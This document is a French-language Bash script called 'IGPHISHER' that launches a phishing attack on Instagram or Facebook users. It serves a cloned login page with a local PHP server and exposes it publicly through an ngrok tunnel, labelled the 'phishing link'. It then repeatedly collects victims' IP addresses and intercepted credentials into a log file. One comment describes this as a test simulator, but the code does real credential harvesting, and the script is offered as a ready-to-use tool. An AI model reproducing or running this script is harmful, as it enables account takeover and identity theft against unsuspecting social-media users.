#!/bin/bash

# Couleurs
RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

clear
echo -e "${CYAN}"
echo "╔══════════════════════════════════════╗"
echo "║     BIENVENUE DANS IGPHISHER         ║"
echo "║      Par IGREQ HENDRIX 👑            ║"
echo "╚══════════════════════════════════════╝"
echo -e "${NC}"

echo "[1] Instagram"
echo "[2] Facebook"
echo "[3] Quitter"
read -p "Choisis la cible : " choix

# Chemin de sauvegarde
LOGS="logs/credentials.log"

# Créer dossier logs si absent
mkdir -p logs

case $choix in
    1)
        SITE="instagram"
        ;;
    2)
        SITE="facebook"
        ;;
    3)
        echo "À bientôt IGREQ 👑"
        exit
        ;;
    *)
        echo -e "${RED}Choix invalide.${NC}"
        exit
        ;;
esac

# Lancer le serveur PHP
echo -e "${GREEN}Démarrage du serveur local sur 127.0.0.1:8080...${NC}"
php -S 127.0.0.1:8080 -t sites/$SITE > /dev/null 2>&1 &
sleep 2

# Lancer ngrok si installé
if command -v ngrok > /dev/null; then
    echo -e "${GREEN}Ngrok est détecté. Génération de lien public...${NC}"
    ngrok http 8080 > /dev/null 2>&1 &
    sleep 5
    LINK=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o "https://[a-zA-Z0-9./?=_-]*")
    echo -e "${CYAN}Lien phishing : $LINK${NC}"
else
    echo -e "${RED}Ngrok non détecté. Utilisation locale uniquement.${NC}"
fi

echo
echo -e "${GREEN}Quand une victime entre ses infos, elles seront enregistrées dans:${NC} ${LOGS}"
echo -e "${CYAN}CTRL + C pour quitter${NC}"

# Créer un faux listener des infos (simulateur pour test)
while true; do
    if [ -f sites/$SITE/ip.txt ]; then
        echo -e "\n${GREEN}[+] Nouvelle victime détectée !${NC}"
        cat sites/$SITE/ip.txt >> $LOGS
        rm sites/$SITE/ip.txt
    fi
    if [ -f sites/$SITE/login.txt ]; then
        echo -e "${CYAN}[+] Identifiants interceptés :${NC}"
        cat sites/$SITE/login.txt | tee -a $LOGS
        rm sites/$SITE/login.txt
    fi
    sleep 3
done
